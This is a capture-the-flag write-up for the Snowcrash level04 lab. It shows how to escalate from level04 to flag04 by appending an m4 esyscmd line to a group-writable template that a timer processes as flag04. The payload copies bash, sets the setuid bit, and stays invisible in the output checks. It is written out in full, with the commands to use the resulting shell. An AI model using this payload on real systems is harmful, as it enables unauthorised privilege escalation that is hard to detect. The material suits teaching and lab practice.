# Snowcrash Level04 — Simple Writeup

**Goal:** Go from user `level04` to user `flag04` by abusing a scheduled job that runs the `m4` macro processor.

---

## 1. Recon — find the target

```bash
find / -user flag04 2>/dev/null
```
```
/var/log/babel
/var/lib/babel/output.conf
/home/flag04
```

```bash
id
```
```
uid=1005(level04) groups=1007(level04),987(babel),1001(levelgroup)
```

We're in group `babel`. Check what that group owns:

```bash
find / -group babel 2>/dev/null
```
```
/var/lib/babel/templates
/var/lib/babel/templates/template.m4
```

One writable file. That's our entire attack surface.

---

## 2. What runs it, and as whom

```bash
cat /etc/systemd/system/babel.service
```
```ini
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
```

```bash
cat /etc/systemd/system/babel.timer
```
```ini
OnUnitActiveSec=30s
```

Every 30 seconds, `babel.sh` runs **as flag04**. Reading `babel.sh` shows it just does:

```bash
m4 "${TEMPLATE}" > "${OUTPUT_CONF}"
```

It feeds `template.m4` — the file we can write to — through `m4`, and saves the result as an nginx config.

---

## 3. Why template.m4 is dangerous

`m4` is a macro/text-substitution tool — `define(NAME, value)` creates a macro, and wherever `NAME` appears later, it gets replaced with `value`. That part is harmless.

But `m4` also ships a builtin called **`esyscmd()`**. It takes one argument, a shell command, actually **runs it**, and splices whatever that command printed into the output text.

So: a "template engine" can run arbitrary shell commands, by design. If we can write to the template, and something privileged runs `m4` on it, we get code execution as that privileged user — in one shot, since `esyscmd` can run a whole chained command (`cmd1; cmd2`) at once.

---

## 4. The payload

```bash
echo "esyscmd(\`cp /bin/bash /tmp/flag04bash; chmod u+s /tmp/flag04bash')dnl" >> /var/lib/babel/templates/template.m4
```

Breaking it down:

| Piece | What it does |
|---|---|
| `>>` | **appends** this line — doesn't overwrite the real template, so the legit config keeps generating fine |
| `\`...'` | m4's quoting style (backtick...single-quote) — everything inside is `esyscmd`'s one argument |
| `esyscmd(...)` | runs the quoted text as a shell command |
| `cp /bin/bash /tmp/flag04bash` | copies bash — the **copy is owned by whoever runs the copy** (flag04), even though the original is root-owned |
| `; chmod u+s /tmp/flag04bash` | setuid the copy — allowed now, since flag04 owns it |
| `dnl` | "delete to newline" — discards the rest of the line so no leftover text or blank line breaks the generated config |

Same copy-then-setuid logic as Level03 — just delivered through `esyscmd` instead of CMake's `execute_process()`, and done in **one** edit instead of two, since `esyscmd` can run a semicolon-chained command in a single call.

---

## 5. Why babel.sh's checks don't catch this

`babel.sh` checksums the output, checks it still has `worker_processes`, and checks a minimum line count. None of this matters here, because:

- `cp` and `chmod` print **nothing** on success
- so the injected line expands to **nothing** and vanishes from the output
- the actual damage (the new setuid binary) happens as a *side effect* while `m4` is processing — not in the text it produces

A diff of the generated config before/after would show **no difference at all**. The checks only ever look at the final text, never at what happened while generating it.

---

## 6. Get the shell and the flag

```bash
sleep 31
ls -la /tmp/flag04bash     # should show owner flag04, mode -rwsr-xr-x
/tmp/flag04bash -p
id
cat /home/flag04/flag04.txt
```

---

## The logic in one paragraph

A scheduled job runs `m4` over a template **as flag04**, and we have group write access to that template. `m4`'s `esyscmd()` builtin runs shell commands and splices their output into the generated text — so writing one `esyscmd(...)dnl` line into the template gets our command executed as flag04 the next time the timer fires. We copy `/bin/bash` (the copy becomes ours, flag04's, since flag04 runs the copy command) and setuid that copy, all in one chained shell command. The service's own validation checks only inspect the final rendered file, and our commands print nothing, so the injected line disappears from the output entirely — nothing looks tampered with, but the setuid binary now exists on disk.
